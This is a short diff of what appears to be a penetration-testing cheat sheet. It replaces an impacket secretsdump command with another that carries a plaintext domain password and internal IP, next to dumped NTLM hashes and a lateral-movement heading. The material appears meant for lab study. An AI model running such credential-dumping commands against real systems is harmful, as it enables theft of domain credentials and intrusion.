@@ -2197,7 +2197,7 @@ alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
 hacker:1006:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
 ````
 ````
-python3 /home/kali/Downloads/impacket-0.9.20/examples/secretsdump.py 'OFFSEC/Allison:RockYou!@192.168.129.59'
+impacket-secretsdump LEGACY/damon:'i6yuT6tym@'@192.168.138.249 -outputfile hashes
 systeminfo #DC01
 ````
 ### Active Directory Lateral Movement <img src="https://cdn-icons-png.flaticon.com/512/9760/9760046.png" width="40" height="40" />
